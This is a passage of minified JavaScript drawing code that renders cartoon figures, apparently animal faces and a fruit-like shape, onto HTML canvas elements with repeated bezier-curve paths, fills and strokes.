      r.bezierCurveTo(e * 9, e * 83, e * 17, e * 93, e * 4, e * 76);
      r.bezierCurveTo(e * 11, e * 75, e * 11, e * 75, e * 18, e * 75);
      r.bezierCurveTo(e * 13, e * 67, e * 13, e * 67, e * 7, e * 59);
      r.bezierCurveTo(e * 14, e * 59, e * 14, e * 59, e * 21, e * 59);
      r.bezierCurveTo(e * 46, e * 35, e * 35, e * 45, e * 49, e * 31);
      r.bezierCurveTo(e * 53, e * 24, e * 51, e * 21, e * 51, e * 16);
      r.bezierCurveTo(e * 63, e * 23, e * 63, e * 24, e * 69, e * 29);
      r.bezierCurveTo(e * 76, e * 7, e * 75, e * 11, e * 76, e * 6);
      r.bezierCurveTo(e * 81, e * 12, e * 84, e * 18, e * 89, e * 27);
      r.bezierCurveTo(e * 95, e * 25, e * 100, e * 16, e * 105, e * 14);
      r.bezierCurveTo(e * 103, e * 25, e * 111, e * 33, e * 110, e * 34);
      r.bezierCurveTo(e * 123, e * 48, e * 123, e * 48, e * 136, e * 62);
      r.bezierCurveTo(e * 142, e * 60, e * 147, e * 59, e * 155, e * 58);
      r.bezierCurveTo(e * 147, e * 65, e * 147, e * 65, e * 139, e * 73);
      r.bezierCurveTo(e * 145, e * 73, e * 145, e * 73, e * 151, e * 73);
      r.bezierCurveTo(e * 145, e * 80, e * 145, e * 80, e * 138, e * 87);
      r.bezierCurveTo(e * 144, e * 88, e * 144, e * 88, e * 150, e * 89);
      r.bezierCurveTo(e * 125, e * 103, e * 125, e * 125, e * 113, e * 141);
      r.bezierCurveTo(e * 92, e * 178, e * 85, e * 177, e * 76, e * 178);
      r.bezierCurveTo(e * 64, e * 179, e * 51, e * 164, e * 35, e * 131);
      r.bezierCurveTo(e * 18, e * 95, e * 13, e * 99, e * 8, e * 93);
      r.closePath();
      ye(r, i[0]);
      r.globalAlpha = 1;
      r.translate(0, -8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 9, e * 93);
      r.bezierCurveTo(e * 17, e * 95, e * 19, e * 95, e * 21, e * 95);
      r.bezierCurveTo(e * 9, e * 83, e * 17, e * 93, e * 4, e * 76);
      r.bezierCurveTo(e * 11, e * 75, e * 11, e * 75, e * 18, e * 75);
      r.bezierCurveTo(e * 13, e * 67, e * 13, e * 67, e * 7, e * 59);
      r.bezierCurveTo(e * 14, e * 59, e * 14, e * 59, e * 21, e * 59);
      r.bezierCurveTo(e * 46, e * 35, e * 35, e * 45, e * 49, e * 31);
      r.bezierCurveTo(e * 53, e * 24, e * 51, e * 21, e * 51, e * 16);
      r.bezierCurveTo(e * 63, e * 23, e * 63, e * 24, e * 69, e * 29);
      r.bezierCurveTo(e * 76, e * 7, e * 75, e * 11, e * 76, e * 6);
      r.bezierCurveTo(e * 81, e * 12, e * 84, e * 18, e * 89, e * 27);
      r.bezierCurveTo(e * 95, e * 25, e * 100, e * 16, e * 105, e * 14);
      r.bezierCurveTo(e * 103, e * 25, e * 111, e * 33, e * 110, e * 34);
      r.bezierCurveTo(e * 123, e * 48, e * 123, e * 48, e * 136, e * 62);
      r.bezierCurveTo(e * 142, e * 60, e * 147, e * 59, e * 155, e * 58);
      r.bezierCurveTo(e * 147, e * 65, e * 147, e * 65, e * 139, e * 73);
      r.bezierCurveTo(e * 145, e * 73, e * 145, e * 73, e * 151, e * 73);
      r.bezierCurveTo(e * 145, e * 80, e * 145, e * 80, e * 138, e * 87);
      r.bezierCurveTo(e * 144, e * 88, e * 144, e * 88, e * 150, e * 89);
      r.bezierCurveTo(e * 125, e * 103, e * 125, e * 125, e * 113, e * 141);
      r.bezierCurveTo(e * 92, e * 178, e * 85, e * 177, e * 76, e * 178);
      r.bezierCurveTo(e * 64, e * 179, e * 51, e * 164, e * 35, e * 131);
      r.bezierCurveTo(e * 18, e * 95, e * 13, e * 99, e * 8, e * 93);
      r.closePath();
      ye(r, i[1]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 28, e * 63);
      r.bezierCurveTo(e * 23, e * 54, e * 24, e * 47, e * 26, e * 37);
      r.bezierCurveTo(e * 28, e * 29, e * 31, e * 31, e * 41, e * 35);
      r.bezierCurveTo(e * 52, e * 45, e * 55, e * 51, e * 57, e * 53);
      r.bezierCurveTo(e * 50, e * 50, e * 44, e * 47, e * 43, e * 48);
      r.bezierCurveTo(e * 43, e * 52, e * 43, e * 52, e * 42, e * 57);
      r.bezierCurveTo(e * 38, e * 54, e * 38, e * 54, e * 33, e * 51);
      r.bezierCurveTo(e * 34, e * 56, e * 34, e * 56, e * 34, e * 61);
      r.closePath();
      ye(r, i[3]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 99, e * 55);
      r.bezierCurveTo(e * 107, e * 43, e * 113, e * 39, e * 121, e * 34);
      r.bezierCurveTo(e * 130, e * 29, e * 130, e * 34, e * 130, e * 42);
      r.bezierCurveTo(e * 131, e * 57, e * 128, e * 61, e * 129, e * 63);
      r.bezierCurveTo(e * 124, e * 62, e * 124, e * 62, e * 119, e * 61);
      r.bezierCurveTo(e * 119, e * 56, e * 120, e * 61, e * 118, e * 52);
      r.bezierCurveTo(e * 115, e * 55, e * 111, e * 59, e * 111, e * 58);
      r.bezierCurveTo(e * 110, e * 54, e * 109, e * 57, e * 109, e * 51);
      r.closePath();
      ye(r, i[3]);
      ze(r, e * 103, e * 110, e * 11);
      ye(r, i[4]);
      ze(r, e * 55, e * 111, e * 11);
      ye(r, i[4]);
      ze(r, e * 99, e * 107, e * 5);
      ye(r, i[1]);
      ze(r, e * 51, e * 108, e * 5);
      ye(r, i[1]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 31, e * 121);
      r.bezierCurveTo(e * 45, e * 128, e * 51, e * 133, e * 53, e * 141);
      r.bezierCurveTo(e * 59, e * 161, e * 70, e * 173, e * 80, e * 169);
      r.bezierCurveTo(e * 89, e * 172, e * 99, e * 149, e * 107, e * 133);
      r.bezierCurveTo(e * 114, e * 122, e * 119, e * 123, e * 124, e * 119);
      r.bezierCurveTo(e * 109, e * 148, e * 117, e * 133, e * 109, e * 147);
      r.bezierCurveTo(e * 87, e * 180, e * 84, e * 179, e * 76, e * 178);
      r.bezierCurveTo(e * 49, e * 173, e * 44, e * 149, e * 31, e * 121);
      r.closePath();
      ye(r, i[5]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.translate(-2, 0);
      r.moveTo(e * 71, e * 162);
      r.bezierCurveTo(e * 80, e * 155, e * 85, e * 159, e * 89, e * 164);
      r.bezierCurveTo(e * 90, e * 171, e * 86, e * 173, e * 79, e * 173);
      r.bezierCurveTo(e * 67, e * 172, e * 67, e * 168, e * 71, e * 162);
      r.closePath();
      ye(r, i[3]);
      r.translate(2, 0);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 9, e * 93);
      r.bezierCurveTo(e * 17, e * 95, e * 19, e * 95, e * 21, e * 95);
      r.bezierCurveTo(e * 9, e * 83, e * 17, e * 93, e * 4, e * 76);
      r.bezierCurveTo(e * 11, e * 75, e * 11, e * 75, e * 18, e * 75);
      r.bezierCurveTo(e * 13, e * 67, e * 13, e * 67, e * 7, e * 59);
      r.bezierCurveTo(e * 14, e * 59, e * 14, e * 59, e * 21, e * 59);
      r.bezierCurveTo(e * 46, e * 35, e * 35, e * 45, e * 49, e * 31);
      r.bezierCurveTo(e * 53, e * 24, e * 51, e * 21, e * 51, e * 16);
      r.bezierCurveTo(e * 63, e * 23, e * 63, e * 24, e * 69, e * 29);
      r.bezierCurveTo(e * 76, e * 7, e * 75, e * 11, e * 76, e * 6);
      r.bezierCurveTo(e * 81, e * 12, e * 84, e * 18, e * 89, e * 27);
      r.bezierCurveTo(e * 95, e * 25, e * 100, e * 16, e * 105, e * 14);
      r.bezierCurveTo(e * 103, e * 25, e * 111, e * 33, e * 110, e * 34);
      r.bezierCurveTo(e * 123, e * 48, e * 123, e * 48, e * 136, e * 62);
      r.bezierCurveTo(e * 142, e * 60, e * 147, e * 59, e * 155, e * 58);
      r.bezierCurveTo(e * 147, e * 65, e * 147, e * 65, e * 139, e * 73);
      r.bezierCurveTo(e * 145, e * 73, e * 145, e * 73, e * 151, e * 73);
      r.bezierCurveTo(e * 145, e * 80, e * 145, e * 80, e * 138, e * 87);
      r.bezierCurveTo(e * 144, e * 88, e * 144, e * 88, e * 150, e * 89);
      r.bezierCurveTo(e * 125, e * 103, e * 125, e * 125, e * 113, e * 141);
      r.bezierCurveTo(e * 92, e * 178, e * 85, e * 177, e * 76, e * 178);
      r.bezierCurveTo(e * 64, e * 179, e * 51, e * 164, e * 35, e * 131);
      r.bezierCurveTo(e * 18, e * 95, e * 13, e * 99, e * 8, e * 93);
      r.closePath();
      ye(r, undefined, i[2], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 25, e * 63);
      r.bezierCurveTo(e * 16, e * 58, e * 17, e * 51, e * 17, e * 33);
      r.bezierCurveTo(e * 19, e * 12, e * 21, e * 12, e * 32, e * 17);
      r.bezierCurveTo(e * 63, e * 31, e * 66, e * 45, e * 66, e * 54);
      ye(r, i[1], i[2], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 91, e * 53);
      r.bezierCurveTo(e * 91, e * 40, e * 98, e * 33, e * 121, e * 20);
      r.bezierCurveTo(e * 137, e * 12, e * 137, e * 16, e * 139, e * 27);
      r.bezierCurveTo(e * 141, e * 49, e * 140, e * 57, e * 134, e * 64);
      ye(r, i[1], i[2], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 31, e * 63);
      r.bezierCurveTo(e * 23, e * 54, e * 24, e * 47, e * 26, e * 37);
      r.bezierCurveTo(e * 28, e * 29, e * 31, e * 31, e * 41, e * 35);
      r.bezierCurveTo(e * 52, e * 45, e * 55, e * 51, e * 57, e * 53);
      r.bezierCurveTo(e * 50, e * 50, e * 44, e * 47, e * 43, e * 48);
      r.bezierCurveTo(e * 43, e * 52, e * 43, e * 52, e * 42, e * 57);
      r.bezierCurveTo(e * 38, e * 54, e * 38, e * 54, e * 33, e * 51);
      r.bezierCurveTo(e * 34, e * 56, e * 34, e * 56, e * 34, e * 61);
      r.closePath();
      ye(r, i[3]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 99, e * 55);
      r.bezierCurveTo(e * 107, e * 43, e * 113, e * 39, e * 121, e * 34);
      r.bezierCurveTo(e * 130, e * 29, e * 130, e * 34, e * 130, e * 42);
      r.bezierCurveTo(e * 131, e * 57, e * 128, e * 61, e * 129, e * 63);
      r.bezierCurveTo(e * 124, e * 62, e * 124, e * 62, e * 119, e * 61);
      r.bezierCurveTo(e * 119, e * 56, e * 120, e * 61, e * 118, e * 52);
      r.bezierCurveTo(e * 115, e * 55, e * 111, e * 59, e * 111, e * 58);
      r.bezierCurveTo(e * 110, e * 54, e * 109, e * 57, e * 109, e * 51);
      r.closePath();
      ye(r, i[3]);
      return t;
    }
    function Ar(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 147;
      t.height = e * 172;
      r.globalAlpha = 0.5;
      r.translate(0, e * 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 8, e * 50);
      r.bezierCurveTo(e * 15, e * 16, e * 49, e * 6, e * 67, e * 6);
      r.bezierCurveTo(e * 121, e * 3, e * 128, e * 32, e * 135, e * 48);
      r.bezierCurveTo(e * 146, e * 96, e * 124, e * 131, e * 96, e * 135);
      r.bezierCurveTo(e * 96, e * 158, e * 79, e * 156, e * 75, e * 156);
      r.bezierCurveTo(e * 50, e * 154, e * 53, e * 150, e * 52, e * 135);
      r.bezierCurveTo(e * 2, e * 127, e * 3, e * 87, e * 8, e * 50);
      r.closePath();
      ye(r, i[0]);
      r.translate(0, e * -8);
      r.globalAlpha = 1;
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 8, e * 50);
      r.bezierCurveTo(e * 15, e * 16, e * 49, e * 6, e * 67, e * 6);
      r.bezierCurveTo(e * 121, e * 3, e * 128, e * 32, e * 135, e * 48);
      r.bezierCurveTo(e * 146, e * 96, e * 124, e * 131, e * 96, e * 135);
      r.bezierCurveTo(e * 96, e * 158, e * 79, e * 156, e * 75, e * 156);
      r.bezierCurveTo(e * 50, e * 154, e * 53, e * 150, e * 52, e * 135);
      r.bezierCurveTo(e * 2, e * 127, e * 3, e * 87, e * 8, e * 50);
      r.closePath();
      ye(r, i[1], i[2], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 14, e * 57);
      r.bezierCurveTo(e * 2, e * 50, e * 5, e * 22, e * 24, e * 22);
      r.bezierCurveTo(e * 41, e * 21, e * 54, e * 32, e * 55, e * 48);
      ye(r, i[1], i[2], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 93, e * 47);
      r.bezierCurveTo(e * 94, e * 24, e * 116, e * 21, e * 120, e * 20);
      r.bezierCurveTo(e * 144, e * 17, e * 146, e * 52, e * 133, e * 58);
      ye(r, i[1], i[2], e * 4);
      ze(r, e * 51, e * 91, e * 9);
      ye(r, i[3]);
      ze(r, e * 95, e * 91, e * 9);
      ye(r, i[3]);
      ze(r, e * 91, e * 89, e * 4);
      ye(r, i[4]);
      ze(r, e * 47, e * 89, e * 4);
      ye(r, i[4]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 54, e * 133);
      r.bezierCurveTo(e * 56, e * 108, e * 64, e * 99, e * 73, e * 98);
      r.bezierCurveTo(e * 86, e * 97, e * 91, e * 119, e * 93, e * 133);
      r.bezierCurveTo(e * 94, e * 155, e * 90, e * 150, e * 74, e * 155);
      r.bezierCurveTo(e * 50, e * 152, e * 55, e * 145, e * 54, e * 134);
      r.closePath();
      ye(r, i[5]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 65.25, e * 135);
      r.bezierCurveTo(e * 75.25, e * 128, e * 83.25, e * 133, e * 83.25, e * 138);
      r.bezierCurveTo(e * 88.25, e * 148, e * 61.25, e * 149, e * 64.25, e * 137);
      r.closePath();
      ye(r, i[6]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 74, e * 145);
      r.bezierCurveTo(e * 74, e * 148, e * 74, e * 148, e * 74, e * 151);
      r.closePath();
      ye(r, undefined, i[6], e * 2);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 19, e * 58);
      r.bezierCurveTo(e * 10, e * 38, e * 18, e * 33, e * 28, e * 34);
      r.bezierCurveTo(e * 41, e * 39, e * 45, e * 45, e * 50, e * 51);
      r.closePath();
      ye(r, i[6]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 100, e * 51);
      r.bezierCurveTo(e * 106, e * 36, e * 119, e * 31, e * 128, e * 36);
      r.bezierCurveTo(e * 137, e * 49, e * 128, e * 58, e * 128, e * 60);
      r.closePath();
      ye(r, i[6]);
      return t;
    }
    function dr(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 271;
      t.height = e * 366;
      r.globalAlpha = 0.5;
      r.translate(0, e * 10);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 133, e * 99);
      r.bezierCurveTo(e * 186, e * 123, e * 199, e * 152, e * 209, e * 169);
      r.bezierCurveTo(e * 228, e * 205, e * 224, e * 245, e * 190, e * 276);
      r.bezierCurveTo(e * 161, e * 296, e * 99, e * 292, e * 79, e * 274);
      r.bezierCurveTo(e * 49, e * 253, e * 47, e * 214, e * 50, e * 197);
      r.bezierCurveTo(e * 61, e * 143, e * 102, e * 113, e * 131, e * 99);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 73, e * 270);
      r.bezierCurveTo(e * 79, e * 280, e * 77, e * 280, e * 78, e * 287);
      r.bezierCurveTo(e * 78, e * 290, e * 83, e * 291, e * 82, e * 299);
      r.bezierCurveTo(e * 81, e * 301, e * 87, e * 301, e * 92, e * 314);
      r.bezierCurveTo(e * 94, e * 319, e * 100, e * 321, e * 107, e * 320);
      r.bezierCurveTo(e * 111, e * 323, e * 114, e * 324, e * 119, e * 320);
      r.bezierCurveTo(e * 137, e * 321, e * 146, e * 323, e * 139, e * 320);
      r.bezierCurveTo(e * 141, e * 324, e * 150, e * 324, e * 153, e * 320);
      r.bezierCurveTo(e * 168, e * 319, e * 171, e * 316, e * 173, e * 307);
      r.bezierCurveTo(e * 180, e * 305, e * 180, e * 301, e * 178, e * 296);
      r.bezierCurveTo(e * 183, e * 296, e * 185, e * 289, e * 188, e * 279);
      r.bezierCurveTo(e * 171, e * 286, e * 149, e * 290, e * 132, e * 289);
      r.bezierCurveTo(e * 101, e * 290, e * 86, e * 280, e * 74, e * 271);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 76, e * 252);
      r.bezierCurveTo(e * 85, e * 294, e * 96, e * 314, e * 103, e * 314);
      r.bezierCurveTo(e * 106, e * 316, e * 151, e * 314, e * 156, e * 314);
      r.bezierCurveTo(e * 169, e * 317, e * 182, e * 285, e * 191, e * 256);
      r.bezierCurveTo(e * 134.5, e * 254, e * 134.5, e * 254, e * 78, e * 252);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 84, e * 257);
      r.bezierCurveTo(e * 122, e * 273, e * 146, e * 268, e * 179, e * 261);
      r.bezierCurveTo(e * 190, e * 258, e * 187, e * 266, e * 178, e * 272);
      r.bezierCurveTo(e * 160, e * 284, e * 123, e * 282, e * 100, e * 277);
      r.bezierCurveTo(e * 73, e * 260, e * 79, e * 257, e * 84, e * 257);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 125, e * 65);
      r.bezierCurveTo(e * 133, e * 45, e * 136, e * 42, e * 141, e * 55);
      r.bezierCurveTo(e * 151, e * 96, e * 164, e * 117, e * 175, e * 134);
      r.bezierCurveTo(e * 203, e * 181, e * 207, e * 182, e * 208, e * 215);
      r.bezierCurveTo(e * 206, e * 240, e * 205, e * 246, e * 184, e * 258);
      r.bezierCurveTo(e * 161, e * 267, e * 131, e * 272, e * 86, e * 258);
      r.bezierCurveTo(e * 67, e * 252, e * 68, e * 239, e * 64, e * 216);
      r.bezierCurveTo(e * 62, e * 194, e * 72, e * 169, e * 92, e * 142);
      r.bezierCurveTo(e * 106, e * 121, e * 114, e * 101, e * 125, e * 65);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 115, e * 37);
      r.bezierCurveTo(e * 116, e * 28, e * 119, e * 27, e * 126, e * 37);
      r.bezierCurveTo(e * 134, e * 48, e * 134, e * 49, e * 132, e * 59);
      r.bezierCurveTo(e * 131, e * 67, e * 127, e * 65, e * 120, e * 56);
      r.bezierCurveTo(e * 114, e * 49, e * 113, e * 43, e * 115, e * 38);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 146, e * 34);
      r.bezierCurveTo(e * 152, e * 28, e * 155, e * 27, e * 157, e * 39);
      r.bezierCurveTo(e * 157, e * 45, e * 157, e * 49, e * 150, e * 56);
      r.bezierCurveTo(e * 141, e * 66, e * 138, e * 66, e * 138, e * 57);
      r.bezierCurveTo(e * 137, e * 50, e * 137, e * 47, e * 141, e * 42);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 143, e * 69);
      r.bezierCurveTo(e * 148, e * 56, e * 156, e * 50, e * 158, e * 58);
      r.bezierCurveTo(e * 159, e * 64, e * 160, e * 67, e * 153, e * 77);
      r.bezierCurveTo(e * 148, e * 83, e * 145, e * 84, e * 143, e * 77);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 149, e * 92);
      r.bezierCurveTo(e * 149, e * 89, e * 151, e * 84, e * 156, e * 79);
      r.bezierCurveTo(e * 161, e * 73, e * 163, e * 78, e * 162, e * 86);
      r.bezierCurveTo(e * 161, e * 91, e * 155, e * 99, e * 152, e * 98);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 111, e * 61);
      r.bezierCurveTo(e * 114, e * 51, e * 117, e * 51, e * 124, e * 64);
      r.bezierCurveTo(e * 128, e * 68, e * 128, e * 76, e * 126, e * 79);
      r.bezierCurveTo(e * 123, e * 84, e * 122, e * 82, e * 115, e * 74);
      r.bezierCurveTo(e * 112, e * 67, e * 115, e * 74, e * 115, e * 74);
      r.bezierCurveTo(e * 111, e * 68, e * 111, e * 66, e * 111, e * 62);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 107, e * 81);
      r.bezierCurveTo(e * 108, e * 74, e * 112, e * 73, e * 118, e * 84);
      r.bezierCurveTo(e * 122, e * 88, e * 122, e * 93, e * 121, e * 98);
      r.bezierCurveTo(e * 114, e * 98, e * 113, e * 98, e * 109, e * 90);
      r.bezierCurveTo(e * 107, e * 87, e * 106, e * 85, e * 107, e * 82);
      r.closePath();
      ye(r, i[0]);
      r.globalAlpha = 1;
      r.translate(0, e * -10);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 133, e * 99);
      r.bezierCurveTo(e * 186, e * 123, e * 199, e * 152, e * 209, e * 169);
      r.bezierCurveTo(e * 228, e * 205, e * 224, e * 245, e * 190, e * 276);
      r.bezierCurveTo(e * 161, e * 296, e * 99, e * 292, e * 79, e * 274);
      r.bezierCurveTo(e * 49, e * 253, e * 47, e * 214, e * 50, e * 197);
      r.bezierCurveTo(e * 61, e * 143, e * 102, e * 113, e * 131, e * 99);
      r.closePath();
      ye(r, i[3], i[3], e * 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 73, e * 270);
      r.bezierCurveTo(e * 79, e * 280, e * 77, e * 280, e * 78, e * 287);
      r.bezierCurveTo(e * 78, e * 290, e * 83, e * 291, e * 82, e * 299);
      r.bezierCurveTo(e * 81, e * 301, e * 87, e * 301, e * 92, e * 314);
      r.bezierCurveTo(e * 94, e * 319, e * 100, e * 321, e * 107, e * 320);
      r.bezierCurveTo(e * 111, e * 323, e * 114, e * 324, e * 119, e * 320);
      r.bezierCurveTo(e * 137, e * 321, e * 146, e * 323, e * 139, e * 320);
      r.bezierCurveTo(e * 141, e * 324, e * 150, e * 324, e * 153, e * 320);
      r.bezierCurveTo(e * 168, e * 319, e * 171, e * 316, e * 173, e * 307);
      r.bezierCurveTo(e * 180, e * 305, e * 180, e * 301, e * 178, e * 296);
      r.bezierCurveTo(e * 183, e * 296, e * 185, e * 289, e * 188, e * 279);
      r.bezierCurveTo(e * 171, e * 286, e * 149, e * 290, e * 132, e * 289);
      r.bezierCurveTo(e * 101, e * 290, e * 86, e * 280, e * 74, e * 271);
      r.closePath();
      ye(r, i[3], i[3], e * 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 76, e * 252);
      r.bezierCurveTo(e * 85, e * 294, e * 96, e * 314, e * 103, e * 314);
      r.bezierCurveTo(e * 106, e * 316, e * 151, e * 314, e * 156, e * 314);
      r.bezierCurveTo(e * 169, e * 317, e * 182, e * 285, e * 191, e * 256);
      r.bezierCurveTo(e * 134.5, e * 254, e * 134.5, e * 254, e * 78, e * 252);
      r.closePath();
      ye(r, i[3], i[3], e * 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 84, e * 257);
      r.bezierCurveTo(e * 122, e * 273, e * 146, e * 268, e * 179, e * 261);
      r.bezierCurveTo(e * 190, e * 258, e * 187, e * 266, e * 178, e * 272);
      r.bezierCurveTo(e * 160, e * 284, e * 123, e * 282, e * 100, e * 277);
      r.bezierCurveTo(e * 73, e * 260, e * 79, e * 257, e * 84, e * 257);
      r.closePath();
      ye(r, i[3], i[3], e * 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 125, e * 65);
      r.bezierCurveTo(e * 133, e * 45, e * 136, e * 42, e * 141, e * 55);
      r.bezierCurveTo(e * 151, e * 96, e * 164, e * 117, e * 175, e * 134);
      r.bezierCurveTo(e * 203, e * 181, e * 207, e * 182, e * 208, e * 215);
      r.bezierCurveTo(e * 206, e * 240, e * 205, e * 246, e * 184, e * 258);
      r.bezierCurveTo(e * 161, e * 267, e * 131, e * 272, e * 86, e * 258);
      r.bezierCurveTo(e * 67, e * 252, e * 68, e * 239, e * 64, e * 216);
      r.bezierCurveTo(e * 62, e * 194, e * 72, e * 169, e * 92, e * 142);
      r.bezierCurveTo(e * 106, e * 121, e * 114, e * 101, e * 125, e * 65);
      r.closePath();
      ye(r, i[3], i[3], e * 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 115, e * 37);
      r.bezierCurveTo(e * 116, e * 28, e * 119, e * 27, e * 126, e * 37);
      r.bezierCurveTo(e * 134, e * 48, e * 134, e * 49, e * 132, e * 59);
      r.bezierCurveTo(e * 131, e * 67, e * 127, e * 65, e * 120, e * 56);
      r.bezierCurveTo(e * 114, e * 49, e * 113, e * 43, e * 115, e * 38);
      r.closePath();
      ye(r, i[3], i[3], e * 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 146, e * 34);
      r.bezierCurveTo(e * 152, e * 28, e * 155, e * 27, e * 157, e * 39);
      r.bezierCurveTo(e * 157, e * 45, e * 157, e * 49, e * 150, e * 56);
      r.bezierCurveTo(e * 141, e * 66, e * 138, e * 66, e * 138, e * 57);
      r.bezierCurveTo(e * 137, e * 50, e * 137, e * 47, e * 141, e * 42);
      r.closePath();
      ye(r, i[3], i[3], e * 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 143, e * 69);
      r.bezierCurveTo(e * 148, e * 56, e * 156, e * 50, e * 158, e * 58);
      r.bezierCurveTo(e * 159, e * 64, e * 160, e * 67, e * 153, e * 77);
      r.bezierCurveTo(e * 148, e * 83, e * 145, e * 84, e * 143, e * 77);
      r.closePath();
      ye(r, i[3], i[3], e * 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 149, e * 92);
      r.bezierCurveTo(e * 149, e * 89, e * 151, e * 84, e * 156, e * 79);
      r.bezierCurveTo(e * 161, e * 73, e * 163, e * 78, e * 162, e * 86);
      r.bezierCurveTo(e * 161, e * 91, e * 155, e * 99, e * 152, e * 98);
      r.closePath();
      ye(r, i[3], i[3], e * 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 111, e * 61);
      r.bezierCurveTo(e * 114, e * 51, e * 117, e * 51, e * 124, e * 64);
      r.bezierCurveTo(e * 128, e * 68, e * 128, e * 76, e * 126, e * 79);
      r.bezierCurveTo(e * 123, e * 84, e * 122, e * 82, e * 115, e * 74);
      r.bezierCurveTo(e * 112, e * 67, e * 115, e * 74, e * 115, e * 74);
      r.bezierCurveTo(e * 111, e * 68, e * 111, e * 66, e * 111, e * 62);
      r.closePath();
      ye(r, i[3], i[3], e * 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 107, e * 81);
      r.bezierCurveTo(e * 108, e * 74, e * 112, e * 73, e * 118, e * 84);
      r.bezierCurveTo(e * 122, e * 88, e * 122, e * 93, e * 121, e * 98);
      r.bezierCurveTo(e * 114, e * 98, e * 113, e * 98, e * 109, e * 90);
      r.bezierCurveTo(e * 107, e * 87, e * 106, e * 85, e * 107, e * 82);
      r.closePath();
      ye(r, i[3], i[3], e * 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 133, e * 99);
      r.bezierCurveTo(e * 186, e * 123, e * 199, e * 152, e * 209, e * 169);
      r.bezierCurveTo(e * 228, e * 205, e * 224, e * 245, e * 190, e * 276);
      r.bezierCurveTo(e * 161, e * 296, e * 99, e * 292, e * 79, e * 274);
      r.bezierCurveTo(e * 49, e * 253, e * 47, e * 214, e * 50, e * 197);
      r.bezierCurveTo(e * 61, e * 143, e * 102, e * 113, e * 131, e * 99);
      r.closePath();
      ye(r, i[1]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 73, e * 270);
      r.bezierCurveTo(e * 79, e * 280, e * 77, e * 280, e * 78, e * 287);
      r.bezierCurveTo(e * 78, e * 290, e * 83, e * 291, e * 82, e * 299);
      r.bezierCurveTo(e * 81, e * 301, e * 87, e * 301, e * 92, e * 314);
      r.bezierCurveTo(e * 94, e * 319, e * 100, e * 321, e * 107, e * 320);
      r.bezierCurveTo(e * 111, e * 323, e * 114, e * 324, e * 119, e * 320);
      r.bezierCurveTo(e * 137, e * 321, e * 146, e * 323, e * 139, e * 320);
